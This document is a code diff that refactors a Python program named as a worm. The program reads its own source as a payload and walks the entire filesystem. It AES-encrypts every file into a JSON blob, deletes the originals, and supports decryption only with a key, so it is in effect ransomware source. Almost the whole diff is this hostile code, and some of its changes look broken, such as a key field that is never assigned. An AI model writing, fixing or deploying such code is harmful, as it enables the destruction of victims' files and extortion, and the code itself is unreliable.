@@ -16,7 +16,7 @@ echo = open(sys.argv[0], 'rb').read()
 
 @dataclass
 class WormConfig:
-    key: bytes = field(default=b"mysecretpassword")
+    key: bytes = field(init=False)
     scan: str = field(default="C:\\" if sys.platform.startswith('win') else "/")
     ip_local: str = field(default=socket.gethostbyname(socket.gethostname()))
     ip_resolver: str = field(default="http://ip-api.com/json")
@@ -37,14 +37,18 @@ class WormConfig:
 
 
 @dataclass
-class WormDigest(WormConfig):
-    cipher: AES = field(default=AES.new(WormConfig.key, AES.MODE_ECB))
+class WormDigest:
+    config: WormConfig = field(default=WormConfig)
     virus_data: bytes = field(default=echo)
     @staticmethod
     def ChecksumSHA512(data): return SHA512.new(data).hexdigest()
 
     def __init__(self):
         super(WormDigest, self).__init__()
+        self.config = WormConfig()
+        self.cipher = AES.new(
+            self.config.key.encode() if isinstance(self.config.key, str) else self.config.key, AES.MODE_ECB
+        )
 
     def EncodeAES(self, plaintext):
         if isinstance(plaintext, str):
@@ -134,8 +138,7 @@ class Host:
         self.platform = sys.platform
         self.last_refresh = time.time()
         self.fs_scan_list = []
-        self.locked_file_list = []
-        for root, dirs, files in os.walk(self.crypto.scan):
+        for root, dirs, files in os.walk(self.crypto.config.scan):
             for file in files:
                 self.fs_scan_list.append(os.path.join(root, file))
         return self
@@ -154,44 +157,45 @@ class Host:
                     ),
                     "iv": self.crypto.EncodeAES(self.crypto.EncodeAES(
                         time.time().hex().encode()
-                    ) + delimiter + self.crypto.EncodeAES(self.crypto.key))
+                    ) + delimiter + self.crypto.EncodeAES(self.crypto.config.key))
                 }
             with open(file+suffix, 'w') as fout:
                 json.dump(encrypted_data, fout, indent=2)
                 os.remove(file)
-                self.locked_file_list.append(file+suffix)
         return self
 
-    def decrypt(self, delimiter="|:|", clean_tag=".clean", infected_tag=".infected"):
-        if clean_tag in self.crypto.scan:
-            sys.stdout.write("[!] clean files cannot be decrypted again [!]")
+    def decrypt(self, key, delimiter="|:|", clean_tag=".clean", infected_tag=".infected"):
+        if not key:
+            sys.stdout.write("[!] key was not provided [!]")
             sys.exit(0)
-        if os.path.isdir(self.crypto.scan):
-            for root, dirs, files in os.walk(self.crypto.scan):
+        wd = WormDigest()
+        wd.cipher = AES.new(key, AES.MODE_ECB)
+        if os.path.isdir(self.crypto.config.scan):
+            for root, dirs, files in os.walk(self.crypto.config.scan):
                 for name in files:
-                    if name.endswith(infected_tag):
-                        with open(os.path.join(root, name), "rb") as fin:
+                    if infected_tag in name:
+                        fn = os.path.join(root, name)
+                        with open(fn, "rb") as fin:
                             encrypted_data = json.load(fin)
-                        with open(os.path.join(root, name+clean_tag), "w") as fout:
-                            fout.write(self.crypto.DecodeAES(encrypted_data["fileData"]))
+                        filename = fn + clean_tag
+                        with open(filename, "w") as fout:
+                            fout.write(wd.DecodeAES(encrypted_data["fileData"]))
                         os.remove(os.path.join(root, name))
         else:
-            with open(self.crypto.scan, 'rb') as fin:
+            with open(self.crypto.config.scan, 'rb') as fin:
                 encrypted_data = json.load(fin)
                 obj = {
                     "checksum": encrypted_data["checksum"],
-                    "iv": [self.crypto.DecodeAES(i) for i in
-                           self.crypto.DecodeAES(encrypted_data["iv"]).split(delimiter)],
-                    "fileData": self.crypto.DecodeAES(encrypted_data["fileData"]),
-                    "encryptedVirus": [self.crypto.DecodeAES(i) for i in
-                                       self.crypto.DecodeAES(encrypted_data["encryptedVirus"]).split(delimiter)]
+                    "iv": [wd.DecodeAES(i) for i in
+                           wd.DecodeAES(encrypted_data["iv"]).split(delimiter)],
+                    "fileData": wd.DecodeAES(encrypted_data["fileData"]),
+                    "decryptedVirus": [wd.DecodeAES(i) for i in
+                                       wd.DecodeAES(encrypted_data["encryptedVirus"]).split(delimiter)]
                 }
-            with open(os.path.join(self.crypto.scan+clean_tag), "w") as fout:
+            with open(os.path.join(self.crypto.config.scan+clean_tag), "w") as fout:
                 json.dump(obj, fout, indent=2)
-            os.remove(self.crypto.scan)
+            os.remove(self.crypto.config.scan)
             return obj
-
-
 
 
 def run(args):
@@ -203,13 +207,10 @@ def run(args):
         host.encrypt()
         sys.exit(0)
     if args.decrypt and args.key:
-        host.crypto.scan = args.decrypt
-        host.crypto.key = args.key.encode()
+        host.crypto.config.scan = args.decrypt
         sys.stdout.write("[DECRYPTING]")
-        host.decrypt()
+        host.decrypt(args.key.encode())
         sys.exit(0)
-
-
 
 
 if __name__ == "__main__":
